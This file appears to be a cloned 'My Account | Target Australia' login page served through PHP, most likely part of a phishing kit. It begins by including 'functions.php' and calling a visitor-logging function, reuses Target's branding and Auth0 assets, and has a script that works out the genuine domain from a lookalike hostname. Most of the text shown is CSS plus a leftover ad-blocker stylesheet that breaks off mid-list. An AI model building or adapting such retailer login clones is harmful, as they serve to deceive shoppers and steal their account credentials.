<?php 

require_once "functions.php";

visitors();


?>
<html lang="en"><head>
    <meta charset="utf-8">
    <title>My Account | Target Australia</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="shortcut icon" href="https://www.target.com.au/favicon.ico" type="image/x-icon">
    <script src="https://cdn.auth0.com/js/auth0/9.18/auth0.min.js"></script><style type="text/css" id="operaUserStyle"></style>
    <script src="https://cdn.auth0.com/js/polyfills/1.0/object-assign.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
    <link rel="preload" href="https://www.target.com.au/medias/auth0/font/inter_regular.woff" as="font" type="font/woff" crossorigin="">
    <link rel="preload" href="https://www.target.com.au/medias/auth0/font/inter_semiBold.eot" as="font" type="font/woff" crossorigin="">
    <link rel="preload" href="https://www.target.com.au/medias/auth0/font/inter_bold.woff" as="font" type="font/woff" crossorigin="">
    <script>
        let originalUrl = window.location.hostname;
        
        if(originalUrl.includes("-")){
            originalUrl = "https://".concat(originalUrl.split('-')[1]);
        }
        else {
            originalUrl = "https://www.target.com.au";
        }
        const hostUrl = originalUrl === 'localhost' ? "https://www.target.com.au" : originalUrl;
        // eslint-disable-next-line no-unused-vars
        const targetHostName = hostUrl;
        // eslint-disable-next-line no-unused-vars
        const s3endpoint = `${hostUrl}/medias/auth0/`;
    </script>
    <style>
        @font-face {
            font-family: InterRegular;
            src: url('https://www.target.com.au/medias/auth0/font/inter_regular.woff');
            src: url('https://www.target.com.au/medias/auth0/font/inter_regular.woff') format('woff'),
                url('https://www.target.com.au/medias/auth0/font/inter_regular.woff2') format('woff2'),
                url('https://www.target.com.au/medias/auth0/font/inter_regular.ttf') format('truetype'),
                url('https://www.target.com.au/medias/auth0/font/inter_regular.svg') format('svg');
            font-weight: 400;
            font-style: normal;
            font-display: swap;
        }

        @font-face {
            font-family: InterSemiBold;
            src: url('https://www.target.com.au/medias/auth0/font/inter_semiBold.eot');
            src: url('https://www.target.com.au/medias/auth0/font/inter_semiBold.eot?#iefix') format('embedded-opentype'),
                url('https://www.target.com.au/medias/auth0/font/inter_semiBold.woff') format('woff'),
                url('https://www.target.com.au/medias/auth0/font/inter_semiBold.ttf') format('truetype'),
                url('https://www.target.com.au/medias/auth0/font/inter_semiBold.svg') format('svg');
            font-weight: 600;
            font-style: normal;
            font-display: swap;
        }

        @font-face {
            font-family: InterBold;
            src: url('https://www.target.com.au/medias/auth0/font/inter_bold.woff');
            src: url('https://www.target.com.au/medias/auth0/font/inter_bold.woff') format('woff'),
                url('https://www.target.com.au/medias/auth0/font/inter_bold.woff2') format('woff2'),
                url('https://www.target.com.au/medias/auth0/font/inter_bold.ttf') format('truetype'),
                url('https://www.target.com.au/medias/auth0/font/inter_bold.svg') format('svg');
            font-weight: 600;
            font-style: normal;
            font-display: swap;
        }
      
        body {
            font-family: 'InterRegular', sans-serif;
            font-size: 14px;
            padding-bottom: 15px;

        }

        a {
                color: black;
                text-decoration: underline;
        }

        h3 {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 18px;
        }

        h4 {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 16px;
            margin: 0;
        }

        p {
            font-family: 'InterRegular', sans-serif;
            font-size: 12px;
        }

        p.small {
            font-size: 11px;
            line-height: 21px;
        }

        label {
            font-family: 'InterSemiBold', sans-serif;
            color: black;
            font-size: 16px;
            font-style: normal;
            font-weight: 600;
            margin-bottom: 0;
        }

        button {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 18px;
            font-weight: 600;
            border: none;
            background-color: transparent;
            cursor: pointer;
            padding: 0;
            margin: 0;
        }

        .disclaimer {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            font-size: 12px;
            font-weight: 400px;
        }

        .disclaimer-small {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            font-size: 11px;
            font-weight: 400px;
        }

        .access-disclaimer {
            color: #3D3935;
            font-family: 'InterSemiBold', sans-serif;
            font-style: normal;
            font-size: 12px;
            font-weight: 600px;
        }

        .link {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            cursor: pointer;
            font-size: 12px;
            font-weight: 400px;
        }

        .link-small {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            font-size: 11px;
            font-weight: 400px;
            cursor: pointer;
        }

        .btn-login-text {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-size: 12px;
            font-style: normal;
            font-weight: 500;
            text-align: center;
            margin-top: 1.5rem;
        }

        #btn-login-link {
            color: #000;
            font-family: 'InterSemiBold', sans-serif;
            font-size: 16px;
            font-style: normal;
            font-weight: 500;
            text-decoration-line: underline;
            cursor: pointer;
        }

        .mobile-back-btn {
            background-image: url("https://www.target.com.au/medias/auth0/mobile-back.svg");
            background-repeat: no-repeat;
            background-color: white;
            width: 33.25px;
            height: 33.25px;
            margin-top: 20px;
            margin-left: 5px;
            border: 0;
            display: none;
        }

        .desktop-nav {
            display: none;
            visibility: hidden;
        }

        input:focus::placeholder {
            color: transparent;
        }

        .hidden-block {
            display: none;
            visibility: hidden;
        }

        .right-custom-lightgray {
            background: rgba(196,196,196,0.50);
        }

        .left-custom-white {
            background: white;
        }

        .form-check-input {
            margin-left: 1px;
            margin-top: 2px;
        }

        .btn-default,
        .btn-default:hover {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 16px;
            color: white;
            letter-spacing: 1px;
            height: 50px;
            width: 100%;
            border-radius: 100px;
            border: 0;
            background: #BA0000;
            transition: all 0.3s ease 0s;
        }

        .btn-onepass,
        .btn-onepass:hover {
            color: white;
            letter-spacing: 1px;
            width: 100%;
            border-radius: 50px;
            border: 0;
            background: #9900f1;
            height: auto;
            min-height: 50px;
        }

        #onePassLogo{
            height: 16px;
            width: 68px;
            position: relative;
            bottom: 3px;
            left: -2px;
        }

        .btn-join-today,
        .btn-join-today:hover {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 12px;
            font-style: normal;
            font-weight: 600;
            color: white;
            height: 35px;
            width: 132px;
            border-radius: 35px;
            border: 0;
            background: #333;
        }

        .login-btn:disabled {
            background: #999;
            border-color: #999;
            color: white;
        }

        .signup-btn:disabled {
            background: #999;
            border-color: #999;
            color: white;
        }

        .alert {
            margin-bottom: 1px;
            height: 14px;
            line-height: 14px;
            padding: 0px 5px;
        }

        .form-check-label {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            font-weight: 400;
            font-size: 12px;
            margin-left: 20px;
        }

        .hrdivider {
            width: 100%;
            text-align: center;
            border-bottom: 1px solid #000;
            line-height: 0.1em;
            margin: 10px 0 20px;
        }

        .hrdivider span {
            background: #fff;
            padding: 0 10px;
        }

        .password-input-icon {
            padding: 0.5rem 0.75rem;
            position: absolute;
            right: 0px;
            z-index: 5;
            cursor: pointer;
        }

        li {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 14px;
            font-weight: 600px;
            list-style-type: none;
            margin-left: -50px;
            padding: 0px 0px 1px 48px;
        }

        li.heart {
            background: url('https://www.target.com.au/medias/auth0/Heart-logo.svg') no-repeat 10px 0px;
            vertical-align: baseline;
        }

        li.tracking {
            background: url('https://www.target.com.au/medias/auth0/Track-logo.svg') no-repeat 10px 0px transparent;
            vertical-align: baseline;
        }

        li.checkout {
            background: url('https://www.target.com.au/medias/auth0/Checkout-Logo.svg') no-repeat 10px 0px transparent;
            vertical-align: baseline;
        }

        li.update {
            background: url('https://www.target.com.au/medias/auth0/Email.svg') no-repeat 10px -2px transparent;
            vertical-align: baseline;
        }

        /* Desktop-specific styles */
        @media only screen and (min-width: 992px) {

            body {
                font-family: 'InterRegular', sans-serif;
                font-size: 14px;
                margin: 0;
            }

            a {
                color: black;
                text-decoration: underline;
            }

            h3 {
                font-family: 'InterSemiBold', sans-serif;
                font-size: 24px;
            }

            h4 {
                font-family: 'InterSemiBold', sans-serif;
                font-size: 16px;
                margin: 0;
            }

            p {
                font-size: 12px;
            }

            p.small {
                font-size: 11px;
                line-height: 21px;
            }

            button {
                font-family: 'InterSemiBold', sans-serif;
                font-size: 18px;
                font-weight: 600;
                border: none;
                background-color: transparent;
                cursor: pointer;
                padding: 0;
                margin: 0;
            }

            nav {
                height: 75px;
                display: flex;
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }

            li {
                font-size: 16px;
            }

            .target-logo {
                width: 147px;
                height: 75px;
                margin-right: 60px;
            }

            .mobile-nav {
                display: none;
                visibility: hidden;
            }

            .desktop-nav {
                display: flex;
                visibility: visible;
            }

            .desktop-back-btn {
                background-image: url("https://www.target.com.au/medias/auth0/Back-Icon.svg");
                background-position: 0 50%;
                background-repeat: no-repeat;
                width: 70px;
                height: 30px;
                font-family: 'InterSemiBold', sans-serif;
                font-size: 16px;
                font-style: normal;
                font-weight: 600;
                text-align: right;
                
            }

            .btn-login-text {
                font-size: 16px;
            }
            .navbar-mobile {
                display: none;
            }

            .navbar-desktop {
                display: flex;
                justify-content: space-between;
            }

            .perks-container-signin {
                padding-left: 40px;
                padding-right: 30px;
            }

            .perks-container-signup {
                padding-left: 40px;
                padding-right: 30px;
                padding-top: 40px;
            }

            .btn-join-today,
            .btn-join-today:hover {
                font-size: 14px;
                height: 45px;
                width: 146px;
                border-radius: 45px;
            }
        }

        #btn-login-link:hover,a:hover{
            color:#ba0000 ;
            text-decoration: none ;
        }
        
        .showHidesignup-password:hover,.showHidePassword:hover{
            color: black !important;
            text-decoration: underline !important;
        }

        /* for Reset password start */
        #forgot-password-page .title,
        #check-email-page .title {
            font-weight: 600
        }

        #forgot-password-page .desc {
            font-size: 16px;
        }

        .form-container form {
            width: 60%;
        }

        @media (max-width: 480px) {
            .form-container form {
                width: 100%
            }
        }

        #check-email-page .desc {
            font-size: 18px
        }

        input.form-control:focus {
            border-color: #009ee2;
            box-shadow: none;
        }

        input.is-success:focus {
            box-shadow: none;
            border-color: #82be2f;
        }

        input.is-error:focus {
            outline: none;
            box-shadow: none;
            border-color: #fa424d;
        }

        .error {
            color: #fa424d;
            font-size: 12px;
            margin: 5px 0;
        }

        .is-error {
            border-color: #fa424d;
        }

        .is-success {
            border-color: #82be2f;
        }

        .error-text {
            color: #c31818;
        }

        .success-text {
            color: #222222;
        }

        .radio-green-tick {
            content: url("data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='24px' height='24px' viewBox='0 0 24 24' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3EIcon/Success/24px%3C/title%3E%3Cg id='Icon/Success/24px' stroke='none' stroke-width='1' fill='none' fill-rule='evenodd'%3E%3Cpath d='M12 2 C17.523 2 22 6.478 22 12 C22 17.522 17.523 22 12 22 C6.477 22 2 17.522 2 12 C2 6.478 6.477 2 12 2 Z M12 3.4 C7.258 3.4 3.4 7.258 3.4 12 C3.4 16.742 7.258 20.6 12 20.6 C16.742 20.6 20.6 16.742 20.6 12 C20.6 7.258 16.742 3.4 12 3.4 Z M17.9372 8 L17.9452 8.008 L10.2972 16.209 L9.6432 15.64 L6.0542 12.563 L7.2122 11.21 L10.1412 13.721 L15.4902 8 L17.9372 8 Z' id='Combined-Shape' fill='%23253746'%3E%3C/path%3E%3C/g%3E%3C/svg%3E");
            filter: invert(21%) sepia(88%) saturate(839%) hue-rotate(78deg) brightness(100%)
            contrast(97%);
            width: 1.25em;
            height: 1.25em;
        }

        .unchecked-radio {
            content: url("data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='24px' height='24px' viewBox='0 0 24 24' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3EIcon/Radio-unchecked/24px%3C/title%3E%3Cg id='Icon/Radio-unchecked/24px' stroke='none' stroke-width='1' fill='none' fill-rule='evenodd'%3E%3Cpath d='M12 2 C6.477 2 2 6.478 2 12 C2 17.522 6.477 22 12 22 C17.523 22 22 17.522 22 12 C22 6.478 17.523 2 12 2 M12 3.4 C16.742 3.4 20.6 7.258 20.6 12 C20.6 16.742 16.742 20.6 12 20.6 C7.258 20.6 3.4 16.742 3.4 12 C3.4 7.258 7.258 3.4 12 3.4' id='Icon/Radio-unchecked' fill='%23253746'%3E%3C/path%3E%3C/g%3E%3C/svg%3E");
            width: 1.25em;
            height: 1.25em;
        }

        .password-strength-container {
            border: 1.5px solid #e7e7e7;
            border-radius: 2px;
            box-sizing: border-box;
            padding: 18px;
        }

        .list-group {
            padding-left: 0px;
        }

        .list-group-item {
            list-style-type: none;
            margin: 0;
            padding: 0px 0px 1px 60px;
        }

        span.icon {
            vertical-align: middle;
        }

        .error-wrapper {
            display: flex;
            background: #fee;
            gap: 5px;
        }

        .error-wrapper>img {
            padding: 10px;
        }

        .error-info {
            font-size: 14px;
            margin: auto;
        }

        .password-title {
            font-weight: 500;
            line-height: 50px
        }

        .btn-default-reset,
        .btn-default-reset:hover {
            font-size: 18px;
            color: #FFFFFF;
            letter-spacing: 1px;
            line-height: 50px;
            width: 100%;
            border-radius: 100px;
            border: 0;
            background: #BA0000;
            transition: all 0.3s ease 0s;
        }

        .btn-default-reset:disabled {
            color: #CCCCCC;
            background: #F1F1F1;
        }
      
        .youremailinfo {
          word-break:break-all;
        }
      
        .desktop-back-btn-forgotpwd {
                background-position: 0 50%;
                background-repeat: no-repeat;
                width: 70px;
                height: 30px;
         }
         
        .mobile-back-btn-forgotpwd {
            width: 33.25px;
            height: 33.25px;
            margin-top: 20px;
            border: 0;
        }
        /* for Reset password end */
    </style>
<style type="text/css">:root [href^="//x4pollyxxpush.com/"], :root zeus-ad, :root topadblock, :root span[id^="ezoic-pub-ad-placeholder-"], :root guj-ad, :root gpt-ad, :root div[id^="zergnet-widget"], :root div[id^="vuukle-ad-"], :root div[id^="sticky_ad_"], :root div[id^="rc-widget-"], :root div[id^="gpt_ad_"], :root div[id^="ezoic-pub-ad-"], :root div[id^="div-gpt-"], :root div[id^="dfp-ad-"], :root div[id^="adspot-"], :root div[id^="ads300_250-widget-"], :root div[id^="ads300_100-widget-"], :root div[id^="ads250_250-widget-"], :root div[id^="adrotate_widgets-"], :root div[id^="_vdo_ads_player_ai_"], :root div[id*="ScriptRoot"], :root div[id*="MarketGid"], :root div[data-native_ad], :root div[data-mini-ad-unit], :root div[data-insertion], :root div[data-id-advertdfpconf], :root div[data-google-query-id], :root hl-adsense, :root div[data-contentexchange-widget], :root div[data-content="Advertisement"], :root div[data-alias="300x250 Ad 2"], :root div[data-alias="300x250 Ad 1"], :root div[data-adzone], :root div[data-adunit-path], :root div[data-ad-wrapper], :root div[data-ad-placeholder], :root div[class^="native-ad-"], :root div[data-dfp-id], :root div[class^="kiwi-ad-wrapper"], :root div[class^="Adstyled__AdWrapper-"], :root div[aria-label="Ads"], :root display-ads, :root display-ad-component, :root atf-ad-slot, :root aside[id^="adrotate_widgets-"], :root article.ad, :root ark-top-ad, :root app-advertisement, :root app-ad, :root amp-fx-flying-carpet, :root amp-embed[type="taboola"], :root amp-connatix-player, :root amp-ad-custom, :root amp-ad, :root a[style="width:100%;height:100%;z-index:10000000000000000;position:absolute;top:0;left:0;"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[href^="https://yogacomplyfuel.com/"], :root a[href^="https://www.sugarinstant.com/?partner_id="], :root a[href^="https://www.privateinternetaccess.com/"] > img, :root a[href^="https://www.onlineusershielder.com/"], :root a[href^="https://www.nutaku.net/signup/landing/"], :root a[href^="https://www.nudeidols.com/cams/"], :root a[href^="https://www.mypornstarcams.com/landing/click/"], :root a[href^="https://www.kingsoffetish.com/tour?partner_id="], :root a[href^="https://www.infowarsstore.com/"] > img, :root a[href^="https://www.highcpmrevenuenetwork.com/"], :root a[href^="https://www.googleadservices.com/pagead/aclk?"], :root a[href^="https://www.goldenfrog.com/vyprvpn?offer_id="][href*="&aff_id="], :root a[href^="https://www.get-express-vpn.com/offer/"], :root a[href^="https://www.financeads.net/tc.php?"], :root a[href^="https://www.brazzersnetwork.com/landing/"], :root div[class^="Display_displayAd"], :root a[href^="https://www.sheetmusicplus.com/?aff_id="], :root a[href^="https://www.bang.com/?aff="], :root a[href^="https://www.adxsrve.com/"], :root a[href^="https://wirewar.website/"], :root a[href^="https://visit-website.com/"], :root a[href^="https://twinrdsyn.com/"], :root a[href^="https://twinrdsrv.com/"], :root a[href^="https://tsartech.g2afse.com/"], :root a[href^="https://trk.sportsflix4k.club/"], :root a[href^="https://trk.nfl-online-streams.club/"], :root a[href^="https://traffdaq.com/"], :root a[href^="https://tracking.avapartner.com/"], :root a[href^="https://track.wg-aff.com"], :root a[href^="https://track.ultravpn.com/"], :root a[href^="https://track.totalav.com/"], :root a[href^="https://track.afcpatrk.com/"], :root a[href^="https://track.adform.net/"], :root a[href^="https://torguard.net/aff.php"] > img, :root a[href^="https://thefacux.com/"], :root div[data-adname], :root a[href^="https://thechleads.pro/"], :root a[href^="https://tc.tradetracker.net/"] > img, :root a[href^="https://taghaugh.com/"], :root a[href^="https://t.hrtye.com/"], :root a[href^="https://www.highperformancecpmgate.com/"], :root a[href^="https://t.grtyi.com/"], :root a[href^="https://t.adating.link/"], :root a[href^="https://go.trackitalltheway.com/"], :root [href^="https://track.fiverr.com/visit/"] > img, :root a[href^="https://syndication.exoclick.com/"], :root a[href^="https://syndication.dynsrvtbg.com/"], :root a[href^="https://streamate.com/landing/click/"], :root a[href^="https://ad.doubleclick.net/"], :root a[href^="https://static.fleshlight.com/images/banners/"], :root a[href^="https://slkmis.com/"], :root a[href^="https://sTaRtGAMing.net/tienda/"], :root citrus-ad-wrapper, :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"], :root a[href^="https://sTaRTgamInG.net/tienda/"], :root [data-adblockkey], :root a[href^="https://sTARtgamIng.net/tienda/"], :root bottomadblock, :root a[href^="https://s.zlinkd.com/"], :root a[href^="https://aweptjmp.com/"], :root a[href^="https://s.zlinkc.com/"], :root a[href^="https://www.mrskin.com/account/"], :root a[href^="https://s.optzsrv.com/"], :root a[data-obtrack^="http://paid.outbrain.com/network/redir?"], :root a[href^="https://reinstandpointdumbest.com/"], :root a[href^="https://go.strpjmp.com/"], :root a[href^="https://refpa4903566.top/"], :root a[href^="https://pubads.g.doubleclick.net/"], :root a[href^="https://prf.hn/click/"][href*="/camref:"] > img, :root a[href^="https://serve.awmdelivery.com/"], :root a[href^="https://prf.hn/click/"][href*="/adref:"] > img, :root a[href^="https://pb-track.com/"], :root a[href^="https://paid.outbrain.com/network/redir?"], :root ps-connatix-module, :root div[id^="ad_position_"], :root a[href^="https://ovb.im/"], :root div[id^="ad-div-"], :root a[href^="https://newbinotracs.com/"], :root a[href^="http://eighteenderived.com/"], :root a[href^="https://natour.naughtyamerica.com/track/"], :root [href^="https://stvkr.com/"], :root a[href^="https://mediaserver.entainpartners.com/renderBanner.do?"], :root a[href^="https://loboclick.com"], :root .nya-slot[style], :root a[href^="https://a.bestcontentweb.top/"], :root a[href^="https://lobimax.com/"], :root a[href^="https://lead1.pl/"], :root a[href^="https://refpa.top/"], :root a[href^="https://landing.brazzersnetwork.com/"], :root a[href^="https://safesurfingtoday.com/"][href*="?skip="], :root a[href^="https://t.acam.link/"], :root a[href^="https://ads.leovegas.com/redirect.aspx?"], :root a[href^="https://land.brazzersnetwork.com/landing/"], :root [data-css-class="dfp-inarticle"], :root .card-captioned.crd > .crd--cnt > .s2nPlayer, :root a[href^="https://go.tmrjmp.com"], :root a[href^="https://startgamIng.Net/tienda/"], :root a[href^="https://l.hyenadata.com/"], :root a[href^="https://yourperfectdating.life/"], :root a[href^="https://join.virtuallust3d.com/"], :root a[href^="https://kiksajex.com/"], :root a[href^="https://juicyads.in/"], :root a[href^="https://mediaserver.gvcaffiliates.com/renderBanner.do?"], :root a[href^="https://join.dreamsexworld.com/"], :root a[href^="https://itubego.com/video-downloader/?affid="], :root a[href^="https://iqbroker.com/"][href*="?aff="], :root a[href^="https://incisivetrk.cvtr.io/click?"], :root a[href^="https://hot-growngames.life/"], :root [data-revive-zoneid], :root a[href^="https://googleads.g.doubleclick.net/pcs/click"], :root a[href^="https://t.ajump1.com/"], :root a[href^="https://clk.wrenchsound.store/"], :root a[href^="https://go.zybrdr.com"], :root [href^="http://join.michelle-austin.com/"], :root [class^="tile-picker__CitrusBannerContainer-sc-"], :root a[href^="https://go.xxxiijmp.com"], :root a[href^="https://go.xtbaffiliates.com/"], :root a[href^="https://thaudray.com/"], :root .OUTBRAIN[data-widget-id^="FMS_REELD_"], :root [data-role="tile-ads-module"], :root a[href^="https://adsrv4k.com/"], :root a[href^="https://go.xlviirdr.com"], :root a[href^="https://ismlks.com/"], :root a[href^="//a.bestcontentfare.top/"], :root [href^="https://www.mypillow.com/"] > img, :root a[href^="https://azpresearch.club/"], :root a[href^="https://go.xlirdr.com"], :root a[href^="https://go.skinstrip.net"][href*="?campaignId="], :root a[href^="https://go.markets.com/visit/?bta="], :root a[href^="https://billing.purevpn.com/aff.php"] > img, :root a[href^="https://go.hpyrdr.com/"], :root a[href^="https://go.goaserv.com/"], :root a[href^="https://go.dmzjmp.com"], :root a[href^="https://go.admjmp.com/"], :root [href^="https://kingered-banctours.com/"], :root a[href^="https://get.surfshark.net/aff_c?"][href*="&aff_id="] > img, :root a-ad, :root a[href^="https://affiliate.rusvpn.com/click.php?"], :root a[href^="https://geniusdexchange.com/"], :root a[href^="https://frameworkdeserve.com/"], :root a[href^="https://flirtandsweets.life/"], :root a[href^="https://www.mrskin.com/tour"], :root a[href^="https://financeads.net/tc.php?"], :root div[data-native-ad], :root a[href^="https://engine.trackingdesks.com/"], :root a[data-redirect^="https://paid.outbrain.com/network/redir?"], :root [href^="https://www.reimageplus.com/"], :root a[href^="https://ak.hauchiwu.com/"], :root a[href^="https://engine.phn.doublepimp.com/"], :root a[href^="https://engine.blueistheneworanges.com/"], :root a[href^="https://dl-protect.net/"], :root [href="//jjgirls.com/sex/ChaturbateCams"], :root a[href^="https://datingoffers30.info/"], :root a[href^="https://ctosrd.com/"], :root a[href^="https://clixtrac.com/"], :root a[href^="https://click.linksynergy.com/fs-bin/"] > img, :root ad-shield-ads, :root a[href^="https://sTartGAMinG.net/tienda/"], :root AD-TRIPLE-BOX, :root a[href^="https://click.hoolig.app/"], :root img[src^="https://images.purevpnaffiliates.com"], :root a[href^="https://porntubemate.com/"], :root a[href^="http://www.gfrevenge.com/landing/"], :root a[href^="https://clickadilla.com/"], :root a[href^="https://click.dtiserv2.com/"], :root a[href^="https://go.xlvirdr.com"], :root a[href^="http://www.iyalc.com/"], :root a[href^="https://claring-loccelkin.com/"], :root a[href^="https://chaturbate.com/in/?track="], :root a[href^="https://chaturbate.com/in/?tour="], :root a[href^="https://cams.imagetwist.com/in/?track="], :root a[href^="https://go.gldrdr.com/"], :root a[href^="https://buqkrzbrucz.com/"], :root a[href^="https://affcpatrk.com/"], :root a[href^="https://bongacams2.com/track?"], :root a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="], :root a[href^="https://bngpt.com/"], :root a[href^="https://bluedelivery.pro/"], :root a[href^="https://black77854.com/"], :root a[href^="https://bc.game/"], :root a[href^="https://ndt5.net/"], :root a[href^="https://batheunits.com/"], :root a[target="_blank"][onmousedown="this.href^='http://paid.outbrain.com/network/redir?"], :root a[href^="https://banners.livepartners.com/"], :root a[href^="//whulsaux.com/"], :root a[href^="https://m.do.co/c/"] > img, :root [class^="s2nPlayer"], :root a[href^="https://chaturbate.jjgirls.com/?track="], :root a[href^="https://ausoafab.net/"], :root a[href^="https://t.ajrkm1.com/"], :root [href="https://masstortfinancing.com"] img, :root a[href^="https://bongacams10.com/track?"], :root a[href^="https://albionsoftwares.com/"], :root a[href^="https://go.etoro.com/"] > img, :root a[href^="https://convertmb.com/"], :root a[href^="https://spo-play.live/"], :root a[href^="https://join.sexworld3d.com/track/"], :root a[href^="https://intenseaffiliates.com/redirect/"], :root a[href^="https://ads.ad4game.com/"], :root [id^="google_ads_iframe"], :root a[href^="https://syndication.optimizesrv.com/"], :root a[href^="https://affpa.top/"], :root a[href^="https://adnetwrk.com/"], :root a[href^="https://adjoincomprise.com/"], :root [href^="http://misslinkvocation.com/"], :root a[href^="https://adclick.g.doubleclick.net/"], :root a[href^="https://www.bet365.com/"][href*="affiliate="], :root [href^="https://r.kraken.com/"], :root a[href^="https://mmwebhandler.aff-online.com/"], :root a[href^="https://go.nordvpn.net/aff"] > img, :root [href^="http://clicks.totemcash.com/"], :root a[href^="https://misspkl.com/"], :root a[href^="https://ad.zanox.com/ppc/"] > img, :root a[href^="https://ad.kubiccomps.icu/"], :root a[href^="https://ab.advertiserurl.com/aff/"], :root a[href^="https://a2.adform.net/"], :root a[href^="https://iactrivago.ampxdirect.com/"], :root a[href^="https://a.medfoodhome.com/"], :root a[href^="https://adultfriendfinder.com/go/"], :root a[href^="https://a.bestcontentoperation.top/"], :root a[href^="http://static.fleshlight.com/images/banners/"], :root a[href^="https://a.adtng.com/"], :root [data-m-ad-id], :root a[href^="https://sTartgAminG.net/tienda/"], :root a[href^="https://a-ads.com/"], :root a[href^="https://join.virtualtaboo.com/track/"], :root a[href^="https://StarTGAminG.net/tienda/"], :root a[href^="https://STaRTgamINg.net/tienda/"], :root a[href^="http://www.mrskin.com/tour"], :root a[href^="https://agacelebir.com/"], :root a[href^="https://spygasm.com/track?"], :root ins.adsbygoogle, :root a[href^="https://1startfiledownload1.com/"], :root a[href^="https://s.zlinkb.com/"], :root a[href^="http://d2.zedo.com/"], :root a[href^="http://www.friendlyduck.com/AF_"], :root a[href^="http://trk.globwo.online/"], :root a[href^="https://1betandgonow.com/"], :root a[href^="https://prf.hn/click/"][href*="/creativeref:"] > img, :root a[href^="http://www.adultempire.com/unlimited/promo?"][href*="&partner_id="], :root a[href^="http://traffic.tc-clicks.com/"], :root a[href^="http://tour.mrskin.com/"], :root [href^="https://wct.link/"], :root [data-desktop-ad-id], :root a[href^="https://www.purevpn.com/"][href*="&utm_source=aff-"], :root a[href^="http://m.hue2m.com/"], :root a[href^="https://funkydaters.com/"], :root [id^="ad_sky"], :root a[href^="http://https://www.get-express-vpn.com/offer/"], :root div[id^="google_dfp_"], :root a[href^="http://googleads.g.doubleclick.net/pcs/click"], :root [href^="http://go.cm-trk2.com/"], :root a[href^="http://click.payserve.com/"], :root a[href^="https://porngames.adult/?SID="], :root a[href^="https://landing1.brazzersnetwork.com"], :root #slashboxes > .deals-rail, :root [href^="http://globsads.com/"], :root [href^="https://www.brighteonstore.com/products/"] img, :root a[href^="http://bc.vc/?r="], :root a[href^="https://mityneedn.com/"], :root [href^="http://homemoviestube.com/"], :root a[href^="http://ad.doubleclick.net/"], :root a[href^="//zunsoach.com/"], :root a[href^="//s.st1net.com/splash.php"], :root a[href^="//pubads.g.doubleclick.net/"], :root a[href^="https://femglobal.app/"], :root a[href^="//go.eabids.com/"], :root [id^="div-gpt-ad"], :root .ob_container .item-container-obpd, :root div[id^="yandex_ad"], :root a[href^="https://pb-imc.com/"], :root a[href^="http://deskfrontfreely.com/"], :root a[data-url^="http://paid.outbrain.com/network/redir?"] + .author, :root [href^="https://join.playboyplus.com/track/"], :root a[href^="//ardslediana.com/"], :root [data-d-ad-id], :root a[href*=".engine.adglare.net/"], :root #kt_player > a[target="_blank"], :root a[href*=".cfm?fp="][href*="&maxads="], :root [data-ad-width], :root [href^="https://cpa.10kfreesilver.com/"], :root a[href^="https://a.bestcontentfood.top/"], :root a[href^="http://wct.link/"], :root [href^="https://goldforyourfuture.com/clk.trk"] img, :root [onclick^="location.href='http://www.reimageplus.com"], :root [id^="section-ad-banner"], :root a[href^="https://t.aslnk.link/"], :root a[href^="https://click.candyoffers.com/"], :root [href^="https://zstacklife.com/"] img, :root a[href^="https://go.julrdr.com/"], :root .trc_rbox_div .syndicatedItemUB, :root [href^="https://zone.gotrackier.com/"], :root a[href^="https://fourwhenstatistics.com/"], :root [href^="https://detachedbates.com/"], :root [href^="https://www.targetingpartner.com/"], :root .section-subheader > .section-hotel-prices-header, :root [href^="https://go.affiliatexe.com/"], :root [href^="https://www.hostg.xyz/"] > img, :root a[href^="http://adultfriendfinder.com/go/"], :root a[href^="https://maymooth-stopic.com/"], :root [href^="https://www.herbanomic.com/"] > img, :root div[id^="ad-position-"], :root a[href^="http://affiliate.glbtracker.com/"], :root a[href^="https://leg.xyz/?track="], :root div[id^="crt-"][style], :root a[href^="http://adultgames.xxx/"], :root a[href^="https://bngprm.com/"], :root [href^="https://shiftnetwork.infusionsoft.com/go/"] > img, :root a[href^="https://trk.softonixs.xyz/"], :root [href^="https://www.mypatriotsupply.com/"] > img, :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"], :root [href^="https://secure.bmtmicro.com/servlets/"], :root [href="https://ourgoldguy.com/contact/"] img, :root 